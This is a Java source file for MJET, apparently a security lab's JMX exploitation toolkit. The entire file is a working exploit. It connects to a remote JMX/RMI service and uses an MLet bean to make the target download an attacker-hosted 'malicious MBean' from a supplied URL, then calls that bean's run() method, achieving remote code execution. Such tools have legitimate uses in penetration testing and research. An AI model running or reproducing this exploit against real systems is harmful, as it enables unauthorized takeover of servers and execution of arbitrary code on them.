package de.mogwaisecurity.lab.mjet;

import org.apache.commons.cli.*;
import javax.management.remote.*;
import javax.management.*;

import java.util.*;

public class Mjet {

	/**
	 * @param args
	 */
	public static void main(String[] args) {

		System.out.println("---------------------------------------------------");
		System.out.println("MJET - Mogwai Security JMX Exploitation Toolkit 0.1");
		System.out.println("---------------------------------------------------");
		System.out.println();
		
		CommandLineParser parser = new org.apache.commons.cli.BasicParser();
		
		Options cmdOptions = createCmdOptions();
	
		CommandLine cmd= null;
		
		try {
			cmd = parser.parse(cmdOptions, args);				
		}
		catch(ParseException exp) {
		    System.err.println( "[-] Error: " + exp.getMessage());
		    System.err.println();
		 
		    // automatically generate the help statement
		    HelpFormatter formatter = new HelpFormatter();
		    formatter.printHelp( "mjet", cmdOptions );
		    System.exit(1);
		}
		
		pwnJMXService(cmd);
	}

	private static Options createCmdOptions()
	{
		Options cmdOptions = new Options();

		// Required arguments
		Option targetOption = OptionBuilder.withArgName("host").hasArg().withDescription("target host").isRequired(true).create('t');
		Option portOption = OptionBuilder.withArgName("port").hasArg().withDescription("target service port").isRequired(true).create('p');
		Option urlOption = OptionBuilder.withArgName("url").hasArg().withDescription("url of the mlet web server").isRequired(true).create('u');

		targetOption.setLongOpt("target");
		portOption.setLongOpt("port");
		urlOption.setLongOpt("url");
		
		cmdOptions.addOption(targetOption);
		cmdOptions.addOption(portOption);
		cmdOptions.addOption(urlOption);		
		
		// Optional arguments
		Option helpOption = new Option("help", false, "show this help");
		cmdOptions.addOption(helpOption);
		
		return cmdOptions;
	}
	   
	static void pwnJMXService(CommandLine line) {
		try {
			String serverName = line.getOptionValue("t");
			String servicePort = line.getOptionValue("p");
			String mLetUrl = line.getOptionValue("u");
	        JMXServiceURL url = new JMXServiceURL("service:jmx:rmi:///jndi/rmi://" + serverName + ":" + servicePort +  "/jmxrmi");
	        
	        System.out.println("[+] Connecting to JMX URL: "+url +" ...");
	      
	        JMXConnector connector = JMXConnectorFactory.connect(url);
	        MBeanServerConnection mBeanServer = connector.getMBeanServerConnection();
	            
	        System.out.println("[+] Connected: " + connector.getConnectionId());
	      
	        ObjectInstance payloadBean = null;

	        System.out.println("[+] Trying to create MLet bean...");
	        ObjectInstance mLetBean = null;
	        
	        try {
	        	mLetBean = mBeanServer.createMBean("javax.management.loading.MLet", null);
	        } catch (javax.management.InstanceAlreadyExistsException e) {
	        	mLetBean = mBeanServer.getObjectInstance(new ObjectName("DefaultDomain:type=MLet"));
	        }
	            
	        System.out.println("[+] Loaded "+mLetBean.getClassName());
	        System.out.println("[+] Loading malicious MBean from " + mLetUrl);
	        System.out.println("[+] Invoking: "+mLetBean.getClassName() + ".getMBeansFromURL");	              
	        Object res = mBeanServer.invoke(mLetBean.getObjectName(), "getMBeansFromURL",
	        		new Object[] { mLetUrl },
	        		new String[] { String.class.getName() }
	            );
	        
	        HashSet res_set = ((HashSet)res);
	        Iterator itr = res_set.iterator();
	        Object nextObject = itr.next();
	       
	        if (nextObject instanceof Exception) {
	                throw ((Exception)nextObject);
	        }
	        payloadBean  = ((ObjectInstance)nextObject);
	           
	        System.out.println("[+] Loaded class: "+ payloadBean.getClassName());	            
	        System.out.println("[+] Loaded MBean Server ID: "+ payloadBean.getObjectName());
	        System.out.println("[+] Invoking: "+ payloadBean.getClassName()+".run()");	             
	        
	        mBeanServer.invoke(payloadBean.getObjectName(), "run", new Object[]{}, new String[]{});
	        
	        System.out.println("[+] Done");
	        
		} catch (Exception e) {
			e.printStackTrace();
	    }
	}
}
